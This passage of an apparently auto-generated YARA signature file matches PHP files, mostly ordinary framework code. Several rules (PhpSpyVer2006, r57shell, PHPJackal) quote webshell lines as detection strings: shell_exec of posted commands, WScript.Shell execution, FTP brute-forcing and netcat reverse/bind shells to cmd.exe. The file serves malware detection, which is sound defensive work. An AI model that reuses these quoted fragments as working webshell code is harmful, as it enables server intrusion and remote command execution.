      $s5 = "$event->getRequest()->willReturn($request);" fullword ascii
      $s6 = "use Sylius\\Component\\Locale\\Provider\\LocaleProviderInterface;" fullword ascii
      $s7 = "use Sylius\\Component\\Locale\\Context\\LocaleContextInterface;" fullword ascii
      $s8 = "$this->onKernelRequest($event);" fullword ascii
      $s9 = "GetResponseEvent $event," fullword ascii
      $s10 = "$this->beConstructedWith($localeContext, $localeProvider);" fullword ascii
      $s11 = "final class RequestLocaleSetterSpec extends ObjectBehavior" fullword ascii
      $s12 = "namespace spec\\Sylius\\Bundle\\LocaleBundle\\Listener;" fullword ascii
      $s13 = "function it_sets_locale_and_default_locale_on_request(" fullword ascii
      $s14 = "$request->setDefaultLocale('en_US')->shouldBeCalled();" fullword ascii
      $s15 = "$request->setLocale('pl_PL')->shouldBeCalled();" fullword ascii
      $s16 = "LocaleProviderInterface $localeProvider," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RemoteWithCrap4jCept
{
   meta:
      description = "php22 - file RemoteWithCrap4jCept.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3a89f3fd4dc4a99a005bbf063b322c8b78ab61e49dccc4a6f339cb5c77284d4f"
   strings:
      $x1 = "$I->executeCommand('run remote --coverage-crap4j');" fullword ascii
      $s2 = "$I->seeInShellOutput('Crap4j report generated in crap4j.xml');" fullword ascii
      $s3 = "#$I->seeCoverageStatsNotEmpty();" fullword ascii
      $s4 = "$I->seeFileFound('crap4j.xml', 'tests/_output');" fullword ascii
      $s5 = "$I->wantTo('try generate remote crap4j xml report');" fullword ascii
      $s6 = "$I = new CoverGuy($scenario);" fullword ascii
      $s7 = "$I->amInPath('tests/data/sandbox');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}


rule PercentageExtensionSpec
{
   meta:
      description = "php22 - file PercentageExtensionSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9e6bd545f9cdaeef60c8085303691c4916d2b8fa741ac425d779b93c30ae7432"
   strings:
      $s1 = "$this->getPercentage(0.112)->shouldReturn('11.2 %');" fullword ascii
      $s2 = "function it_returns_float_number_as_percentage(): void" fullword ascii
      $s3 = "namespace spec\\Sylius\\Bundle\\UiBundle\\Twig;" fullword ascii
      $s4 = "function it_is_twig_extension(): void" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PDOStatementGenerator
{
   meta:
      description = "php22 - file PDOStatementGenerator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3e7682c0c1fb1291602a49078bb33c70f0222256304b476dbba9fa0a429565ee"
   strings:
      $x1 = "public static function generateExecute(string $propertyName, string $constName, string $args)" fullword ascii
      $s2 = "\"return \\$this->{$propertyName}->execute($args);\"," fullword ascii
      $s3 = "\"\\$this->{$propertyName}->execute($args);\"," fullword ascii
      $s4 = "\"return \\$this->read->prepare(\" . var_export($sql, true) . \");\"," fullword ascii
      $s5 = "public static function generateReadPrepare(string $sql)" fullword ascii
      $s6 = "public static function generateFetchOne(string $propertyName, string $constName, string $class, string $args)" fullword ascii
      $s7 = "public static function generateFetchAll(string $propertyName, string $constName, string $class, string $args)" fullword ascii
      $s8 = "namespace Maghead\\Generator;" fullword ascii
      $s9 = "\"    \\$this->{$propertyName} = \\$this->read->prepare(self::$constName);\"," fullword ascii
      $s10 = "\"return \\$this->{$propertyName}->fetchAll();\"," fullword ascii
      $s11 = "\"\\$obj = \\$this->{$propertyName}->fetch();\"," fullword ascii
      $s12 = "\"\\$this->{$propertyName}->closeCursor();\"," fullword ascii
      $s13 = "\"   \\$this->{$propertyName} = \\$this->write->prepare(self::$constName);\"," fullword ascii
      $s14 = "// \"return \\$this->{$propertyName}->fetchAll(PDO::FETCH_CLASS);\"," fullword ascii
      $s15 = "\"if (!\\$this->{$propertyName}) {\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule ReportWidgetBase
{
   meta:
      description = "php22 - file ReportWidgetBase.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8b6e73aec57b5d5d535e9f4bd99f02d2bc0dedb6e86e2b10d90643e43d0c5597"
   strings:
      $s1 = "* Report widgets are used inside the ReportContainer." fullword ascii
      $s2 = "* Report Widget base class" fullword ascii
      $s3 = "* @author Alexey Bobkov, Samuel Georges" fullword ascii
      $s4 = "* @package october\\backend" fullword ascii
      $s5 = "class ReportWidgetBase extends WidgetBase" fullword ascii
      $s6 = "use \\System\\Traits\\PropertyContainer;" fullword ascii
      $s7 = "$this->properties = $this->validateProperties($properties);" fullword ascii
      $s8 = "public function __construct($controller, $properties = [])" fullword ascii
      $s9 = "parent::__construct($controller);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PhpSpyVer2006
{
   meta:
      description = "php22 - file PhpSpyVer2006.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cdb2650f3e0f6e7e2bc112329f142c9171c953ba62f849f3f16a0f65ec9a8e6f"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x3 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x4 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $s5 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s6 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");" fullword ascii
      $s7 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s8 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s9 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s10 = "angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s11 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s12 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
      $s13 = "\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s14 = ": '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));" fullword ascii
      $s15 = "$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");" fullword ascii
      $s16 = "echo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>" fullword ascii
      $s17 = "$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'" fullword ascii
      $s18 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s19 = "37 => array(\"FTP\",getfun(\"ftp_login\"))," fullword ascii
      $s20 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule QueueingDispatcher
{
   meta:
      description = "php22 - file QueueingDispatcher.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "501264482fe659b6f4f0851d40a76d6aa1a8bbf54c09d640f2c431ead2ae8add"
   strings:
      $s1 = "* Dispatch a command to its appropriate handler behind a queue." fullword ascii
      $s2 = "* @param  mixed  $command" fullword ascii
      $s3 = "public function dispatchToQueue($command);" fullword ascii
      $s4 = "interface QueueingDispatcher extends Dispatcher" fullword ascii
      $s5 = "namespace Illuminate\\Contracts\\Bus;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule r57shell_v_1_42_edited_by_kibngdefacer
{
   meta:
      description = "php22 - file r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x4 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x5 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x6 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x7 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x8 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x9 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x10 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x11 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x12 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x13 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x14 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x15 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
      $x16 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x17 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x18 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
      $x19 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x20 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*)
}


rule php22_Pptx
{
   meta:
      description = "php22 - file Pptx.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bf7a03edd0835b2eb6ca1485b5dddf75542f50036b8227fa9ae120424eacbda3"
   strings:
      $x1 = "* @copyright  Copyright (c) 2005-2011 Zend Technologies USA Inc. (http://www.zend.com)" fullword ascii
      $s2 = "throw new Zend_Search_Lucene_Exception('MS Office documents processing functionality requires Zip extension to be loaded');" fullword ascii
      $s3 = "throw new Zend_Search_Lucene_Exception('MS Office documents processing functionality requires Zip extension to be lo" fullword ascii
      $s4 = "$slideRelations = simplexml_load_string($package->getFromName( $this->absoluteZipPath(dirname($rel[\"Target\"]) . " fullword ascii
      $s5 = "\"Target\"]) . \"/\" . dirname($slideRel[\"Target\"]) . \"/_rels/\" . basename($slideRel[\"Target\"]) . \".rels\")) );" fullword ascii
      $s6 = "$package->getFromName( $this->absoluteZipPath(dirname($rel[\"Target\"]) . \"/\" . dirname($slideRel[\"Tar" fullword ascii
      $s7 = "Rel[\"Target\"]) . \"/\" . dirname($slideNoteRel[\"Target\"]) . \"/\" . basename($slideNoteRel[\"Target\"])) )" fullword ascii
      $s8 = "$package->getFromName( $this->absoluteZipPath(dirname($rel[\"Target\"]) . \"/\" . dirname($slide" fullword ascii
      $s9 = "const SCHEMA_SLIDENOTESRELATION = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide';" fullword ascii
      $s10 = "const SCHEMA_SLIDERELATION = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide';" fullword ascii
      $s11 = "$slideNotesRelations = simplexml_load_string($package->getFromName( $this->absoluteZipPath(dirname($rel[" fullword ascii
      $s12 = "const SCHEMA_PRESENTATIONML = 'http://schemas.openxmlformats.org/presentationml/2006/main';" fullword ascii
      $s13 = "\"/_rels/\" . basename($rel[\"Target\"]) . \".rels\")) );" fullword ascii
      $s14 = "* @version    $Id: Pptx.php 23775 2011-03-01 17:25:24Z ralph $" fullword ascii
      $s15 = "* Xml Schema - Slide notes relation" fullword ascii
      $s16 = "const SCHEMA_DRAWINGML = 'http://schemas.openxmlformats.org/drawingml/2006/main';" fullword ascii
      $s17 = "get\"]) . \"/\" . basename($slideRel[\"Target\"])) )" fullword ascii
      $s18 = "* @param boolean $storeContent" fullword ascii
      $s19 = "* Xml Schema - DrawingML" fullword ascii
      $s20 = "* Xml Schema - PresentationML" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule OrderShowMenuBuilderEvent
{
   meta:
      description = "php22 - file OrderShowMenuBuilderEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d8271828f06730c441c1b34e02f37ed57fffaf0611ab045ed9a5c84b500e2d8"
   strings:
      $s1 = "* @param StateMachineInterface $stateMachine" fullword ascii
      $s2 = "public function getStateMachine(): StateMachineInterface" fullword ascii
      $s3 = "* @param FactoryInterface $factory" fullword ascii
      $s4 = "* @return StateMachineInterface" fullword ascii
      $s5 = "* @var StateMachineInterface" fullword ascii
      $s6 = "* @return OrderInterface" fullword ascii
      $s7 = "* @param ItemInterface $menu" fullword ascii
      $s8 = "* @param OrderInterface $order" fullword ascii
      $s9 = "public function getOrder(): OrderInterface" fullword ascii
      $s10 = "* @var OrderInterface" fullword ascii
      $s11 = "use Sylius\\Bundle\\UiBundle\\Menu\\Event\\MenuBuilderEvent;" fullword ascii
      $s12 = "namespace Sylius\\Bundle\\AdminBundle\\Event;" fullword ascii
      $s13 = "private $stateMachine;" fullword ascii
      $s14 = "use SM\\StateMachine\\StateMachineInterface;" fullword ascii
      $s15 = "parent::__construct($factory, $menu);" fullword ascii
      $s16 = "$this->stateMachine = $stateMachine;" fullword ascii
      $s17 = "private $order;" fullword ascii
      $s18 = "use Knp\\Menu\\FactoryInterface;" fullword ascii
      $s19 = "StateMachineInterface $stateMachine" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ObjectNotCreatedException
{
   meta:
      description = "php22 - file ObjectNotCreatedException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d98ac6f5e707ec9c6f3c328984ce9ab59c394b3571391caacf04b72569e7a71"
   strings:
      $s1 = "* The exception that is thrown when an object could not be created." fullword ascii
      $s2 = "namespace ScriptFUSION\\Porter\\Provider;" fullword ascii
      $s3 = "class ObjectNotCreatedException extends \\RuntimeException" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PHPJackalv1_5
{
   meta:
      description = "php22 - file PHPJackalv1.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "34df5c5ca0e3e1160a5849ddcca1375cd5d4eb7adb39f65cb0fa7eb520f169ac"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x3 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x4 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x5 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x7 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href=\\\"http://netjackal.by.ru\\\" target=\\\"_blank\\\">NetJackal</a>$et\";" fullword ascii
      $x8 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x9 = "if(!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x10 = "filE=/var/cpanel/accounting.log&workingdiR=$cwd\").\"\\\">Readable</a>\"; else echo \"Not readable\";}else echo \"Not found\";" fullword ascii
      $x11 = "if (!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x12 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x13 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x14 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x15 = "if (empty($CPU))$CPU = shelL(\"echo %PROCESSOR_IDENTIFIER%\");" fullword ascii
      $x16 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x17 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x18 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x19 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x20 = "echo \"<font color=blue>Port scanning started against \".htmlspecialchars($target).\":<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule php_error
{
   meta:
      description = "php22 - file php_error.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1e649da35134dd155e6ad7997490d2365922da9acb98ee98d010feb6e9bd6f92"
   strings:
      $s1 = "echo ($error_line - 1).\":\\t\".e(trim($debug_lines[$error_line - 1])).\"\\n\";" fullword ascii
      $s2 = "<p style=\"font-size: 13px; color: #333;\"><strong><?php echo $filepath; ?> @ line <?php echo $error_line; ?>:</strong></p>" fullword ascii
      $s3 = "echo ($error_line + 1).\":\\t\".e(trim($debug_lines[$error_line + 1])).\"\\n\";" fullword ascii
      $s4 = "<p style=\"font-size: 13px; color: #333;\"><?php echo $type; ?> [ <?php echo $severity; ?> ]: <?php echo e($message); ?></p>" fullword ascii
      $s5 = "echo \"<strong>{$error_line}:\\t\".e(trim($debug_lines[$error_line])).\"</strong>\\n\";" fullword ascii
      $s6 = "<div style=\"border: 1px solid #CCC; padding: 10px; background-color: #FFF; color: #333;\">" fullword ascii
      $s7 = "<p style=\"font-size: 13px; color: #333;\"><strong><?php echo $severity; ?>!</strong></p>" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 2KB and
      all of them
}

rule PrioritizedServiceRegistrySpec
{
   meta:
      description = "php22 - file PrioritizedServiceRegistrySpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "031e98d8058c057f62e610fa8ac6ff1dba0ac96335728ee4d8fce378099ce6ca"
   strings:
      $s1 = "function it_throws_exception_if_trying_to_unregister_service_of_non_existing_type(SampleServiceInterface $service): void" fullword ascii
      $s2 = "function it_throws_exception_when_trying_to_check_for_a_registered_service_without_required_interface(" fullword ascii
      $s3 = "use spec\\Sylius\\Component\\Registry\\Fixture\\SampleServiceInterface;" fullword ascii
      $s4 = "use Sylius\\Component\\Registry\\PrioritizedServiceRegistryInterface;" fullword ascii
      $s5 = "function it_throws_exception_when_trying_to_register_service_without_required_interface(\\stdClass $service): void" fullword ascii
      $s6 = "use Sylius\\Component\\Registry\\NonExistingServiceException;" fullword ascii
      $s7 = "require_once __DIR__ . '/Fixture/SampleServiceInterface.php';" fullword ascii
      $s8 = "$this->register($serviceTwo, -1);" fullword ascii
      $s9 = "function it_initializes_services_priority_queue_by_default(): void" fullword ascii
      $s10 = "function it_unregisters_service(SampleServiceInterface $service): void" fullword ascii
      $s11 = "function it_implements_prioritized_service_registry_interface(): void" fullword ascii
      $s12 = "function it_registers_services_in_the_correct_prioritized_order(" fullword ascii
      $s13 = "$this->has($service)->shouldReturn(false);" fullword ascii
      $s14 = "$this->has($serviceOne)->shouldReturn(false);" fullword ascii
      $s15 = "$this->has($serviceThree)->shouldReturn(false);" fullword ascii
      $s16 = "$this->has($service)->shouldReturn(true);" fullword ascii
      $s17 = "$this->has($serviceThree)->shouldReturn(true);" fullword ascii
      $s18 = "$this->has($serviceOne)->shouldReturn(true);" fullword ascii
      $s19 = "$this->has($serviceTwo)->shouldReturn(true);" fullword ascii
      $s20 = "$this->has($serviceTwo)->shouldReturn(false);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule php22_reg
{
   meta:
      description = "php22 - file reg.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bb0eb6edca4bfda5387baa2e62875292e8af616cbd2dd9524d9999638f1ff0e6"
   strings:
      $s1 = "<a href=\"index.php?action=login\">" fullword ascii
      $s2 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">" fullword ascii
      $s3 = "<input type=\"password\" name=\"password\" id=\"password\" value=\"\">" fullword ascii
      $s4 = "<link rel=\"alternate icon\" type=\"image/png\" href=\"<?php echo CSS_Path; ?>assets/i/favicon.png\">" fullword ascii
      $s5 = "<link rel=\"stylesheet\" href=\"<?php echo CSS_Path; ?>assets/css/amazeui.min.css\"/>" fullword ascii
      $s6 = "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">" fullword ascii
      $s7 = "<meta name=\"format-detection\" content=\"telephone=no\">" fullword ascii
      $s8 = "<label for=\"password\">" fullword ascii
      $s9 = "<meta http-equiv=\"Cache-Control\" content=\"no-siteapp\" />" fullword ascii
      $s10 = "<meta name=\"renderer\" content=\"webkit\">" fullword ascii
      $s11 = "<head lang=\"en\">" fullword ascii
      $s12 = "<input type=\"text\" name=\"invitcode\" id=\"text\" value=\"" fullword ascii
      $s13 = "<input type=\"email\" name=\"email\" id=\"email\" value=\"\">" fullword ascii
      $s14 = "<input type=\"submit\" name=\"submit\" value=\" " fullword ascii
      $s15 = "<p>Webshell " fullword ascii
      $s16 = ".header p {" fullword ascii
      $s17 = "<form method=\"post\" class=\"am-form\">" fullword ascii
      $s18 = ".header h1 {" fullword ascii
      $s19 = "<?php if(isset($tip))echo $tip; ?>" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 5KB and
      8 of them
}

rule ProcessHelperTest
{
   meta:
      description = "php22 - file ProcessHelperTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "577a0b6acdfa41ab9cb1275d956a1c94d64a829a48aa65172aa045077bfcf9f7"
   strings:
      $x1 = "array($successOutputDebug, new Process('php -r \"echo 42;\"'), StreamOutput::VERBOSITY_DEBUG, null)," fullword ascii
      $s2 = "public function testVariousProcessRuns($expected, $cmd, $verbosity, $error)" fullword ascii
      $s3 = "array($syntaxErrorOutputVerbose, 'php -r \"fwrite(STDERR, \\'error message\\');usleep(50000);fwrite(STDOUT, \\'out messa" fullword ascii
      $s4 = "array($errorMessage.PHP_EOL, 'php -r \"fwrite(STDERR, \\'error message\\');usleep(50000);fwrite(STDOUT, \\'out message\\'" fullword ascii
      $s5 = "array($syntaxErrorOutputDebug, 'php -r \"fwrite(STDERR, \\'error message\\');usleep(500000);fwrite(STDOUT, \\'out messag" fullword ascii
      $s6 = "RUN  php -r \"fwrite(STDERR, 'error message');usleep(50000);fwrite(STDOUT, 'out message');exit(252);\"" fullword ascii
      $s7 = "RUN  php -r \"fwrite(STDERR, 'error message');usleep(500000);fwrite(STDOUT, 'out message');exit(252);\"" fullword ascii
      $s8 = "array($syntaxErrorOutputDebug.$errorMessage.PHP_EOL, 'php -r \"fwrite(STDERR, \\'error message\\');usleep(500000);fwrit" fullword ascii
      $s9 = "array($syntaxErrorOutputVerbose.$errorMessage.PHP_EOL, 'php -r \"fwrite(STDERR, \\'error message\\');usleep(50000);fwri" fullword ascii
      $s10 = "array($successOutputProcessDebug, array('php', '-r', 'echo 42;'), StreamOutput::VERBOSITY_DEBUG, null)," fullword ascii
      $s11 = "$successOutputProcessDebug = str_replace(\"'php' '-r' 'echo 42;'\", $args, $successOutputProcessDebug);" fullword ascii
      $s12 = "array($successOutputDebugWithTags, 'php -r \"echo \\'<info>42</info>\\';\"', StreamOutput::VERBOSITY_DEBUG, null)," fullword ascii
      $s13 = "* @dataProvider provideCommandsAndOutput" fullword ascii
      $s14 = "use Symfony\\Component\\Console\\Helper\\ProcessHelper;" fullword ascii
      $s15 = "array($successOutputVerbose, 'php -r \"echo 42;\"', StreamOutput::VERBOSITY_VERY_VERBOSE, null)," fullword ascii
      $s16 = "array('', 'php -r \"syntax error\"', StreamOutput::VERBOSITY_VERBOSE, null)," fullword ascii
      $s17 = "use Symfony\\Component\\Process\\Process;" fullword ascii
      $s18 = "public function testPassedCallbackIsExecuted()" fullword ascii
      $s19 = "array($successOutputDebug, 'php -r \"echo 42;\"', StreamOutput::VERBOSITY_DEBUG, null)," fullword ascii
      $s20 = "RES  252 Command did not run successfully" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule OpcacheController
{
   meta:
      description = "php22 - file OpcacheController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "90568d8b9dd78339b608565845a4de9463312e3bb730d3479303669e23342da6"
   strings:
      $s1 = "use Symfony\\Component\\HttpKernel\\Event\\FilterControllerEvent;" fullword ascii
      $s2 = "use Symfony\\Component\\HttpKernel\\Event\\FilterResponseEvent;" fullword ascii
      $s3 = "public function onKernelController(FilterControllerEvent $event)" fullword ascii
      $s4 = "$content = ob_get_clean();" fullword ascii
      $s5 = "public function onKernelResponse(FilterResponseEvent $event)" fullword ascii
      $s6 = "use Symfony\\Component\\HttpFoundation\\Response;" fullword ascii
      $s7 = "* @param FilterResponseEvent $event" fullword ascii
      $s8 = "* @param FilterControllerEvent $event" fullword ascii
      $s9 = "* @param Request $request" fullword ascii
      $s10 = "use Symfony\\Component\\Routing\\Annotation\\Route;" fullword ascii
      $s11 = "return new Response($content);" fullword ascii
      $s12 = "namespace Pimcore\\Bundle\\AdminBundle\\Controller\\Admin\\External;" fullword ascii
      $s13 = "* @Route(\"/external_opcache\")" fullword ascii
      $s14 = "use Pimcore\\Bundle\\AdminBundle\\Controller\\AdminController;" fullword ascii
      $s15 = "include($path . '/index.php');" fullword ascii
      $s16 = "class OpcacheController extends AdminController implements EventedControllerInterface" fullword ascii
      $s17 = "use Pimcore\\Controller\\EventedControllerInterface;" fullword ascii
      $s18 = "$path = PIMCORE_PROJECT_ROOT . '/vendor/amnuts/opcache-gui';" fullword ascii
      $s19 = "$isMasterRequest = $event->isMasterRequest();" fullword ascii
      $s20 = "public function indexAction(Request $request)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule Preferences
{
   meta:
      description = "php22 - file Preferences.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "af74d047b05304f6cce810bd5b346a223f5a54668f7deae7e86aa1a47c4bbbf3"
   strings:
      $s1 = "use Symfony\\Component\\HttpFoundation\\Session\\Session;" fullword ascii
      $s2 = "public function __construct(Session $session, Repository $config, EventCategory $eventCategory)" fullword ascii
      $s3 = "$handle = $this->config->get('concrete.calendar.topic_attribute');" fullword ascii
      $s4 = "use Concrete\\Core\\Config\\Repository\\Repository;" fullword ascii
      $s5 = "public function getCalendarTopicsAttributeKey()" fullword ascii
      $s6 = "public function getPreferredViewPath()" fullword ascii
      $s7 = "switch($this->session->get('calendar.view')) {" fullword ascii
